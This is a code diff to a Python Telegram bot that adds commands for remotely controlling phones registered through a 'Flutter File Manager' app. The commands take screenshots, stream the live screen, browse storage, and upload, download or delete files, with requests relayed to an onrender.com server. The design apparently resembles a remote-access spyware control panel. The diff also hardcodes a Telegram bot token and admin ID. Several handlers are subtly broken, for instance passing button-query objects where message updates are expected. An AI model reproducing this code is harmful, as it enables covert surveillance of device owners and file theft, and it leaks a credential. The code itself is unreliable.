@@ -8,6 +8,9 @@ import asyncio
 logger = logging.getLogger(__name__)
 
 class BotCommandHandler:
+    # Bot Configuration
+    BOT_TOKEN = '8275823313:AAHfoseImjaz3TK_NDdRFHFI1x82qkG1rhs'
+    ADMIN_ID = '5445671392'
     def __init__(self, bot_token, admin_id, user_manager, device_manager, file_operations):
         self.bot_token = bot_token
         self.admin_id = admin_id
@@ -37,6 +40,12 @@ class BotCommandHandler:
         self.application.add_handler(CommandHandler("delete", self._delete_command))
         self.application.add_handler(CommandHandler("search", self._search_command))
         self.application.add_handler(CommandHandler("status", self._status_command))
+        # Add new enhanced commands
+        self.application.add_handler(CommandHandler("screenshot", self._screenshot_command))
+        self.application.add_handler(CommandHandler("upload", self._upload_command))
+        self.application.add_handler(CommandHandler("screenview", self._screenview_command))
+        self.application.add_handler(CommandHandler("navigate", self._navigate_command))
+        self.application.add_handler(CommandHandler("fileops", self._fileops_command))
         
         # Message handler for non-command messages
         self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self._handle_text_message))
@@ -84,28 +93,47 @@ class BotCommandHandler:
         return True
 
     async def _start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle /start command"""
+        """Handle /start command - Start with device selection"""
         if not await self._check_authorization(update):
             return
-            
-        # Show main menu with buttons
-        await self._show_main_menu_from_command(update)
-    
-    async def _show_main_menu_from_command(self, update: Update):
-        """Show main menu with inline buttons"""
-        keyboard = [
-            [InlineKeyboardButton("📁 File Operations", callback_data="file_operations")],
-            [InlineKeyboardButton("📊 Device Management", callback_data="device_management")],
-            [InlineKeyboardButton("👥 User Management", callback_data="user_management")],
-            [InlineKeyboardButton("ℹ️ Help & Info", callback_data="help_info")],
-        ]
-        
+
+        # Show device selection menu
+        await self._show_device_selection_menu(update)
+
+    async def _show_device_selection_menu(self, update):
+        """Show device selection menu with all registered devices"""
+        devices = self.device_manager.get_all_devices()
+
+        if not devices:
+            await update.message.reply_text("📱 *No Devices Found*\n\n"
+                                          "No devices are currently registered with this bot.\n"
+                                          "Install the Flutter File Manager app and register a device first.", parse_mode='Markdown')
+            return
+
+        # Create device buttons
+        keyboard = []
+        for device_id, device_info in devices.items():
+            status = "🟢 Online" if device_info.get('online_status', False) else "🔴 Offline"
+            device_name = device_info.get('device_name', f'Device_{device_id[-6:]}')
+
+            # Create button text with truncated device name
+            button_text = f"{status} {device_name[:20]}..."
+            device_button = InlineKeyboardButton(button_text, callback_data=f"device:{device_id}")
+            keyboard.append([device_button])
+
+        # Add refresh and help buttons
+        keyboard.append([
+            InlineKeyboardButton("🔄 Refresh", callback_data="refresh_devices"),
+            InlineKeyboardButton("ℹ️ Help", callback_data="help_start")
+        ])
+
         reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        message = "📱 *Flutter File Manager Bot* 📱\n\n"
-        message += "Welcome to your file management assistant!\n\n"
-        message += "Select an option below to navigate:"
-        
+
+        message = "📱 *Device Selection* 📱\n\n"
+        message += f"Found {len(devices)} registered device(s).\n"
+        message += "Select a device to manage:"
+        message += "\n\n🟢 Online devices\n🔴 Offline devices"
+
         await update.message.reply_text(message, parse_mode='Markdown', reply_markup=reply_markup)
 
     async def _help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -408,7 +436,16 @@ class BotCommandHandler:
         data = query.data
         
         # Handle different button actions
-        if data == "main_menu":
+        if data.startswith("device:"):
+            device_id = data[7:]  # Remove "device:" prefix
+            await self._handle_device_selection(query, device_id)
+        elif data == "refresh_devices":
+            await self._handle_refresh_devices(query)
+        elif data == "help_start":
+            await self._show_start_help(query)
+        elif data == "back_to_devices":
+            await self._show_device_operation_menu(query)
+        elif data == "main_menu":
             await self._show_main_menu(query)
         elif data == "file_operations":
             await self._show_file_operations_menu(query)
@@ -430,8 +467,18 @@ class BotCommandHandler:
             await self._devices_command_from_button(query)
         elif data == "users":
             await self._users_command_from_button(query)
+        elif data == "screenshot":
+            await self._handle_screenshot_button(query)
+        elif data == "screenview":
+            await self._handle_screenview_button(query)
+        elif data == "upload":
+            await self._handle_upload_button(query)
+        elif data == "navigate":
+            await self._handle_navigate_button(query)
+        elif data == "delete":
+            await self._handle_delete_button(query)
         else:
-            await query.edit_message_text("Unknown action")
+            await query.edit_message_text("❓ Unknown action")
 
     async def _show_main_menu(self, query):
         """Show main menu with inline buttons"""
@@ -642,6 +689,279 @@ class BotCommandHandler:
         """Handle /menu command to show interactive menu"""
         if not await self._check_authorization(update):
             return
-            
+
         # Show main menu with buttons
         await self._show_main_menu_from_command(update)
+
+    async def _screenshot_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /screenshot command"""
+        if not await self._check_authorization(update):
+            return
+
+        args = context.args
+        device_id = args[0] if args else None
+
+        if not device_id:
+            await update.message.reply_text("📝 Please specify device ID.\n\n*Usage:* `/screenshot <device_id>`", parse_mode='Markdown')
+            return
+
+        # Send command to device via HTTP
+        await self._send_device_command(device_id, 'screenshot', {}, update)
+
+    async def _upload_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /upload command to upload files to device"""
+        if not await self._check_authorization(update):
+            return
+
+        args = context.args
+        if len(args) < 3:
+            await update.message.reply_text("📝 Please provide device ID and file details.\n\n*Usage:* `/upload <device_id> <local_file_id> <destination_path>`", parse_mode='Markdown')
+            return
+
+        device_id = args[0]
+        file_id = args[1]
+        destination_path = ' '.join(args[2:])
+
+        try:
+            # Download file from Telegram
+            file_response = await self.application.bot.get_file(file_id)
+            file_url = f"https://api.telegram.org/file/bot{self.bot_token}/{file_response.file_path}"
+
+            # Send upload command to device
+            await self._send_device_command(device_id, 'upload', {
+                'file_url': file_url,
+                'destination_path': destination_path,
+                'file_name': file_response.file_path.split('/')[-1]
+            }, update)
+
+        except Exception as e:
+            await update.message.reply_text(f"❌ Error uploading file: {str(e)}")
+
+    async def _screenview_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /screenview command for live screen viewing"""
+        if not await self._check_authorization(update):
+            return
+
+        args = context.args
+        device_id = args[0] if args else None
+
+        if not device_id:
+            await update.message.reply_text("📝 Please specify device ID.\n\n*Usage:* `/screenview <device_id>`", parse_mode='Markdown')
+            return
+
+        # Send screen view command to device
+        await self._send_device_command(device_id, 'live_screen', {}, update)
+        await update.message.reply_text("📺 Live screen viewing started. Device will stream screen updates.", parse_mode='Markdown')
+
+    async def _navigate_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /navigate command for device file navigation"""
+        if not await self._check_authorization(update):
+            return
+
+        args = context.args
+        if len(args) < 2:
+            await update.message.reply_text("📝 Please specify device ID and path.\n\n*Usage:* `/navigate <device_id> <directory_path>`", parse_mode='Markdown')
+            return
+
+        device_id = args[0]
+        directory_path = ' '.join(args[1:])
+
+        # Send navigate command to device
+        await self._send_device_command(device_id, 'navigate', {'path': directory_path}, update)
+
+    async def _fileops_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /fileops command for direct file operations"""
+        if not await self._check_authorization(update):
+            return
+
+        args = context.args
+        if len(args) < 3:
+            await update.message.reply_text("📝 Please specify operation, device ID, and parameters.\n\n*Usage:*\n"
+                                          "`/fileops <device_id> list <path>`\n"
+                                          "`/fileops <device_id> search <query>`\n"
+                                          "`/fileops <device_id> download <file_path>`\n"
+                                          "`/fileops <device_id> delete <file_path>`", parse_mode='Markdown')
+            return
+
+        device_id = args[0]
+        operation = args[1]
+        parameters = ' '.join(args[2:])
+
+        # Send file operation command to device
+        await self._send_device_command(device_id, operation, {'params': parameters}, update)
+
+    async def _send_device_command(self, device_id, command, params, update):
+        """Send command to device via HTTP"""
+        try:
+            import requests
+
+            # Check if device exists
+            device = self.device_manager.get_device(device_id)
+            if not device:
+                await update.message.reply_text(f"❌ Device `{device_id}` not found.", parse_mode='Markdown')
+                return
+
+            # Send command to bot server which will forward to device
+            response = requests.post(
+                f'https://bot-ugkn.onrender.com/command',
+                json={
+                    'device_id': device_id,
+                    'command': command,
+                    'params': params,
+                    'chat_id': str(update.effective_user.id),
+                    'timestamp': str(update.message.date)
+                }
+            )
+
+            if response.status_code == 200:
+                await update.message.reply_text(f"✅ Command `{command}` sent to device `{device_id}`", parse_mode='Markdown')
+            else:
+                await update.message.reply_text(f"❌ Failed to send command: {response.text}")
+
+        except Exception as e:
+            await update.message.reply_text(f"❌ Error sending command: {str(e)}")
+
+    async def _handle_device_selection(self, query, device_id):
+        """Handle device selection from button"""
+        # Check if device exists
+        device = self.device_manager.get_device(device_id)
+        if not device:
+            await query.edit_message_text("❌ Device not found.")
+            return
+
+        # Store selected device in user context (could use context or database)
+        self.selected_device = device_id
+
+        # Show device operations menu
+        await self._show_device_operation_menu(query, device_id, device)
+
+    async def _show_device_operation_menu(self, query, device_id=None, device_info=None):
+        """Show operations menu for selected device"""
+        if device_id is None:
+            device_id = getattr(self, 'selected_device', None)
+            if device_id:
+                device = self.device_manager.get_device(device_id)
+                if device:
+                    device_info = device
+
+        if not device_id or not device_info:
+            await query.edit_message_text("❌ No device selected.")
+            return
+
+        device_name = device_info.get('device_name', f'Device_{device_id[-6:]}')
+        status = "🟢 Online" if device_info.get('online_status', False) else "🔴 Offline"
+
+        # Create operation buttons
+        keyboard = [
+            [InlineKeyboardButton("📸 Screenshot", callback_data="screenshot")],
+            [InlineKeyboardButton("📺 Screen View", callback_data="screenview")],
+            [InlineKeyboardButton("📁 File Browser", callback_data="navigate")],
+            [InlineKeyboardButton("⬆️ Upload File", callback_data="upload")],
+            [InlineKeyboardButton("🗑️ Delete File", callback_data="delete")],
+            [InlineKeyboardButton("📊 Device Status", callback_data="status")],
+            [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_devices")],
+            [InlineKeyboardButton("⬅️ Change Device", callback_data="back_to_devices")]
+        ]
+
+        reply_markup = InlineKeyboardMarkup(keyboard)
+
+        message = f"📱 *Device: {device_name}*\n"
+        message += f"Status: {status}\n\n"
+        message += "Select an operation:"
+
+        await query.edit_message_text(message, parse_mode='Markdown', reply_markup=reply_markup)
+
+    async def _handle_refresh_devices(self, query):
+        """Refresh device list"""
+        await self._show_device_selection_menu(query.message)
+
+    async def _show_start_help(self, query):
+        """Show help for start screen"""
+        message = "📱 *Device Selection Help*\n\n"
+        message += "🟢 Online devices - Ready for commands\n"
+        message += "🔴 Offline devices - Commands may be delayed\n\n"
+        message += "Select a device to access:\n"
+        message += "• 📸 Screenshot - Capture device screen\n"
+        message += "• 📺 Screen View - Live viewing\n"
+        message += "• 📁 File Browser - Navigate files\n"
+        message += "• ⬆️ Upload - Send files to device\n"
+        message += "• 🗑️ Delete - Remove files\n"
+        message += "• 📊 Status - Device information\n\n"
+        message += "*Commands to use:*\n"
+        message += "/start - Show device selection"
+
+        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="back_to_devices")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+
+        await query.edit_message_text(message, parse_mode='Markdown', reply_markup=reply_markup)
+
+    # Button handlers for device operations
+    async def _handle_screenshot_button(self, query):
+        """Handle screenshot button"""
+        device_id = getattr(self, 'selected_device', None)
+        if not device_id:
+            await query.edit_message_text("❌ No device selected.")
+            return
+
+        await self._send_device_command(device_id, 'screenshot', {}, query)
+        await query.edit_message_text("📸 Screenshot command sent!\n\nThe device will capture and send a screenshot.", parse_mode='Markdown')
+
+    async def _handle_screenview_button(self, query):
+        """Handle screen view button"""
+        device_id = getattr(self, 'selected_device', None)
+        if not device_id:
+            await query.edit_message_text("❌ No device selected.")
+            return
+
+        await self._send_device_command(device_id, 'live_screen', {}, query)
+        await query.edit_message_text("📺 Live screen viewing started!\n\nThe device will stream screen updates.", parse_mode='Markdown')
+
+    async def _handle_upload_button(self, query):
+        """Handle upload file button - requires user interaction"""
+        await query.edit_message_text("⬆️ *Upload File*\n\n"
+                                         "Please reply with the file you want to upload to the device.\n\n"
+                                         "Note: After selecting the file, I'll ask for the destination path.", parse_mode='Markdown')
+
+    async def _handle_navigate_button(self, query):
+        """Handle file navigation button"""
+        device_id = getattr(self, 'selected_device', None)
+        if not device_id:
+            await query.edit_message_text("❌ No device selected.")
+            return
+
+        await self._send_device_command(device_id, 'navigate', {'path': '/storage/emulated/0'}, query)
+        await query.edit_message_text("📁 File browser opened!\n\nCommand sent to explore device files.", parse_mode='Markdown')
+
+    async def _handle_delete_button(self, query):
+        """Handle delete file button"""
+        await query.edit_message_text("🗑️ *Delete File*\n\n"
+                                         "Please reply with the full path of the file you want to delete.\n\n"
+                                         "Example: `/storage/emulated/0/Documents/file.txt`", parse_mode='Markdown')
+
+    # Override the send_device_command for query objects
+    async def _query_send_device_command(self, device_id, command, params, query):
+        """Send command to device via HTTP (for query objects)"""
+        try:
+            import requests
+
+            device = self.device_manager.get_device(device_id)
+            if not device:
+                await query.edit_message_text(f"❌ Device `{device_id}` not found.", parse_mode='Markdown')
+                return
+
+            response = requests.post(
+                f'https://bot-ugkn.onrender.com/command',
+                json={
+                    'device_id': device_id,
+                    'command': command,
+                    'params': params,
+                    'chat_id': str(query.from_user.id),
+                    'timestamp': str(query.message.date)
+                }
+            )
+
+            return response.status_code == 200
+
+        except Exception as e:
+            print(f'Error sending device command: {e}')
+            return False
